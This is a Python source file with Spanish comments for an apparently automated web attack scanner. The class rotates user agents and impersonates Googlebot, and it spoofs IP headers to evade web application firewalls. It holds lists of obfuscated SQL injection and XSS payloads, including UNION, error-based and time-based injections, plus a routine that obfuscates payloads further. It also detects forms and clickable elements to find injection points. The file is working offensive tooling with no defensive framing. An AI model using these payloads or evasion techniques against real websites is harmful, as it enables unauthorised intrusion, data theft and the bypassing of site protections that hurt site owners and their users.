import random
import time
import base64
import html
import urllib.parse
from typing import List, Dict, Any
import re

class SmartDetector:
    def __init__(self):
        # User-Agents para rotación
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.53 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
        ]
        
        # Técnicas de evasión WAF - Headers alternativos
        self.waf_evasion_headers = [
            {"X-Forwarded-For": self._generate_random_ip()},
            {"X-Originating-IP": self._generate_random_ip()},
            {"X-Remote-IP": self._generate_random_ip()},
            {"X-Remote-Addr": self._generate_random_ip()},
            {"X-Client-IP": self._generate_random_ip()},
            {"X-Forwarded-Host": f"example-{random.randint(1,100)}.com"},
            {"X-Custom-Header": f"Value{random.randint(1000,9999)}"},
            {"Accept-Language": random.choice(["en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7"])},
            {"Referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "https://www.example.com/"])},
            {"Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br"])}
        ]
        
        # Atributos clave para elementos interactivos
        self.interactive_attributes = {
            "visual_cues": [
                "style.cursor === 'pointer'",
                "style.backgroundColor !== 'transparent'",
                "el.offsetWidth > 10 && el.offsetHeight > 10",
                "style.border !== 'none' && style.border !== ''",
                "style.padding !== '0px'"
            ],
            "behavior_cues": [
                "el.onclick !== null",
                "el.addEventListener !== undefined",
                "el.hasAttribute('click')",
                "el.hasAttribute('ng-click')",
                "el.hasAttribute('v-on:click')",
                "el.hasAttribute('@click')"
            ],
            "semantic_cues": [
                "el.tagName === 'BUTTON'",
                "el.tagName === 'A'",
                "el.tagName === 'INPUT' && (el.type === 'submit' || el.type === 'button')",
                "el.getAttribute('role') === 'button'",
                "el.classList.contains('btn')",
                "el.classList.contains('button')"
            ],
            "text_cues": [
                "['submit', 'send', 'login', 'sign', 'register', 'buy', 'comprar', 'add', 'agregar', 'search', 'buscar'].some(t => el.textContent.toLowerCase().includes(t))"
            ]
        }
        
        # Códigos de error para logging
        self.error_codes = {
            400: "Bad Request",
            401: "Unauthorized",
            403: "Forbidden",
            404: "Not Found",
            405: "Method Not Allowed",
            429: "Too Many Requests",
            500: "Internal Server Error",
            501: "Not Implemented",
            502: "Bad Gateway",
            503: "Service Unavailable",
            504: "Gateway Timeout"
        }
        
        # Payloads SQL Injection (ofuscados)
        self.sql_payloads = [
            # Básicos ofuscados
            "' O/**/R '1'='1",
            "' O/**/R/**/ 1=1--",
            "ad'||'min'--",
            "1'/*!50000OR*/1='1",
            "'/*!50000OR*/1='1",
            
            # Comentarios y espacios alternativos
            "'%09OR%09'1'%09=%09'1",
            "'%0DOR%0A'1'%0D=%0A'1",
            "'+/*!50000OR*/+'1'+=+'1",
            
            # Codificación y ofuscación
            "'%20%4F%52%20'1'%3D'1",
            "'+UNION/*&a=*/SELECT+1,2,3--",
            "'+UnI/**/oN+SeL/**/EcT+1,2,3--",
            "'+/*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3--",
            
            # Evasión de filtros
            "'+OR/**/TRUE--",
            "1'+OR+'1'=(SELECT+'1'+FROM+DUAL)--",
            "%27%20%6F%72%20%31%3D%31%20%2D%2D",
            "') OR ('x')=('x",
            
            # Doble codificación
            "'%252f%252a*/OR%252f%252a*/1=1--",
            "'%252b%252f*!50000OR*%252f+'1'%252b=+'1",
            
            # Case swapping
            "' oR '1'='1",
            "' Or '1'='1",
            "' OR/**/LOWER('a')=UPPER('A')--",
            
            # Técnicas avanzadas
            "'%0Bor%0C'1'%0D=%0A'1",
            "'+AND+1=0+UNION+ALL+SELECT+1,2,3--",
            "1'+AND+1=0+UNION/**/ALL+SELECT+1,2,3--",
            "1')+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--",
            "'%2b(select*from(select(sleep(20)))a)%2b'",
            "'%2b(select*from(select(BENCHMARK(2000000,MD5('A'))))a)%2b'"
        ]
        
        # Payloads XSS (ofuscados)
        self.xss_payloads = [
            # Básicos ofuscados
            "<img/src='x'/onerror=alert`1`>",
            "<svg/onload=alert`1`>",
            "jav&#x61;script:alert(1)",
            "<img src=x onerror=\"a=alert,a(1)\">",
            "<body/onload=alert`1`>",
            
            # Evasión de filtros
            "<script>al\\u0065rt(1)</script>",
            "<svg><script>alert&#40;1&#41;</script>",
            "<svg><animate onbegin=alert(1) attributeName=x></animate>",
            "<a href=\"javascript:void(0)\" onmouseover=alert(1)>XSS</a>",
            "<img src=\"javascript:alert(1)\">",
            
            # Ofuscación avanzada
            "'-alert(1)-'",
            "\";alert(1);//",
            "<svg/onload=&#97&#108&#101&#114&#116(1)>",
            "<svg/onload=self[`aler`%2b`t`]`1`>",
            "<script>prompt.call(null,1)</script>",
            
            # Codificación
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<iframe/src='javascript:var x=alert;x(1)'>",
            "<a href=javas&#99;ript:alert(1)>click</a>",
            "<svg/onload=`${prompt(1)}`>",
            
            # Eventos alternativos
            "<body onpageshow=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=1 onerror=alert(1)>",
            "<audio src=1 onerror=alert(1)>",
            
            # Técnicas sin script
            "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\"></table></mtext></math>",
            "\" onmouseover=alert(1) \"",
            "\" onmouseleave=alert(1) \"",
            "\" onfocusin=alert(1) autofocus \"",
            "<marquee loop=1 onfinish=alert(1)>xss</marquee>",
            
            # DOM XSS
            "javascript:setInterval`alert\x28document.domain\x29`",
            "window[/alert/.source](1)",
            "eval('\\u0061lert(1)')",
            "new Function`al\\x65rt\x28/1/\x29```",
            "setTimeout('al'+'ert(1)')"
        ]
        
        # Contador para rotación de evasión WAF
        self.payload_counter = 0
        
    def _generate_random_ip(self) -> str:
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
    async def get_next_user_agent_and_headers(self) -> Dict:
        """Obtiene el siguiente User-Agent y headers para evasión WAF"""
        user_agent = random.choice(self.user_agents)
        
        # Seleccionar 2-3 headers aleatorios para evasión WAF
        evasion_headers = {}
        for header in random.sample(self.waf_evasion_headers, random.randint(2, 3)):
            evasion_headers.update(header)
            
        return {
            "user-agent": user_agent,
            **evasion_headers
        }
        
    async def should_rotate_identity(self) -> bool:
        """Determina si es momento de rotar la identidad"""
        self.payload_counter += 1
        return self.payload_counter % random.randint(3, 4) == 0
        
    async def detect_interactive_elements(self, page) -> List:
        """Detecta elementos interactivos usando múltiples enfoques"""
        return await page.evaluate(f"""
            () => {{
                const elements = [];
                const allElements = document.querySelectorAll('*');
                
                allElements.forEach(el => {{
                    let score = 0;
                    const style = window.getComputedStyle(el);
                    
                    // Verificar pistas visuales
                    if ({' || '.join(self.interactive_attributes['visual_cues'])}) score += 1;
                    
                    // Verificar pistas de comportamiento
                    if ({' || '.join(self.interactive_attributes['behavior_cues'])}) score += 2;
                    
                    // Verificar pistas semánticas
                    if ({' || '.join(self.interactive_attributes['semantic_cues'])}) score += 3;
                    
                    // Verificar pistas textuales
                    if (el.textContent && {' || '.join(self.interactive_attributes['text_cues'])}) score += 2;
                    
                    // Si el puntaje es suficiente, considerar como interactivo
                    if (score >= 2) {{
                        elements.push({{
                            element: el,
                            score: score,
                            text: el.textContent?.trim()?.substring(0, 50) || '',
                            tag: el.tagName,
                            attributes: Array.from(el.attributes).map(attr => 
                                `${{attr.name}}="${{attr.value}}"`).join(' ')
                        }});
                    }}
                }});
                
                // Ordenar por puntaje descendente
                return elements.sort((a, b) => b.score - a.score);
            }}
        """)
        
    async def detect_forms(self, page) -> List:
        """Detecta formularios incluso si no usan la etiqueta form"""
        return await page.evaluate("""
            () => {
                const results = [];
                
                // 1. Formularios tradicionales
                document.querySelectorAll('form').forEach(form => {
                    results.push({
                        type: 'standard_form',
                        element: form,
                        inputs: Array.from(form.querySelectorAll('input, select, textarea')).map(el => ({
                            type: el.type || el.tagName.toLowerCase(),
                            name: el.name,
                            id: el.id,
                            placeholder: el.placeholder,
                            value: el.type === 'password' ? null : el.value
                        })),
                        submit: form.querySelector('button[type="submit"], input[type="submit"]') || 
                               form.querySelector('button, input[type="button"]'),
                        action: form.action,
                        method: form.method
                    });
                });
                
                // 2. Pseudo-formularios (agrupaciones de inputs sin tag form)
                const allInputs = Array.from(document.querySelectorAll('input, select, textarea')).
                                  filter(el => !el.closest('form'));
                                  
                // Agrupar inputs cercanos
                const inputGroups = {};
                allInputs.forEach(input => {
                    const rect = input.getBoundingClientRect();
                    const groupKey = Math.floor(rect.top / 100); // Agrupar por proximidad vertical
                    
                    if (!inputGroups[groupKey]) inputGroups[groupKey] = [];
                    inputGroups[groupKey].push(input);
                });
                
                // Procesar grupos que parecen formularios
                Object.values(inputGroups).forEach(group => {
                    if (group.length >= 2) { // Al menos dos campos
                        // Buscar el botón cercano que podría ser submit
                        const parentElement = group[0].parentElement;
                        const submitButton = parentElement.querySelector('button, [role="button"], [class*="btn"], [class*="button"], a[href="#"]');
                        
                        results.push({
                            type: 'pseudo_form',
                            element: parentElement,
                            inputs: group.map(el => ({
                                type: el.type || el.tagName.toLowerCase(),
                                name: el.name,
                                id: el.id,
                                placeholder: el.placeholder,
                                value: el.type === 'password' ? null : el.value
                            })),
                            submit: submitButton,
                            action: null,
                            method: 'post' // Asumir POST como predeterminado
                        });
                    }
                });
                
                return results;
            }
        """)
        
    def obfuscate_payload(self, payload: str, level: int = 1) -> str:
        """Aplica técnicas de ofuscación a un payload"""
        if level <= 0:
            return payload
            
        techniques = [
            # Nivel 1: ofuscación básica
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%09"),
            lambda p: p.replace("'", "\'"),
            lambda p: p.replace("SELECT", "SeLeCt"),
            
            # Nivel 2: codificación
            lambda p: urllib.parse.quote(p),
            lambda p: p.replace("alert", "al\\u0065rt"),
            lambda p: p.replace("script", "scr\\u0069pt"),
            
            # Nivel 3: ofuscación avanzada
            lambda p: base64.b64encode(p.encode()).decode(),
            lambda p: ''.join([f"&#x{ord(c):x};" for c in p]),
            lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")
        ]
        
        # Aplicar técnicas aleatorias según nivel
        result = payload
        for _ in range(level):
            technique = random.choice(techniques[:min(level*3, len(techniques))])
            result = technique(result)
            
        return result
        
    async def log_response_status(self, response, context: str = "") -> Dict:
        """Registra información detallada sobre respuestas HTTP"""
        status = response.status
        url = response.url
        content_type = response.headers.get("content-type", "")
        
        log_entry = {
            "timestamp": time.time(),
            "status": status,
            "url": url,
            "content_type": content_type,
            "context": context
        }
        
        # Añadir información detallada para códigos de error
        if status >= 400:
            log_entry["error"] = True
            log_entry["error_type"] = self.error_codes.get(status, "Unknown Error")
            
            if 400 <= status < 500:
                log_entry["category"] = "client_error"
            elif status >= 500:
                log_entry["category"] = "server_error"
                
            # Capturar detalles adicionales para ciertos errores
            if status == 403:
                log_entry["details"] = "Access Forbidden - Posible WAF o restricción de acceso"
            elif status == 429:
                log_entry["details"] = "Rate Limiting - Reducir frecuencia de peticiones"
            elif status >= 500:
                log_entry["details"] = "Error del servidor - Posible vulnerabilidad o sobrecarga"
                
        return log_entry 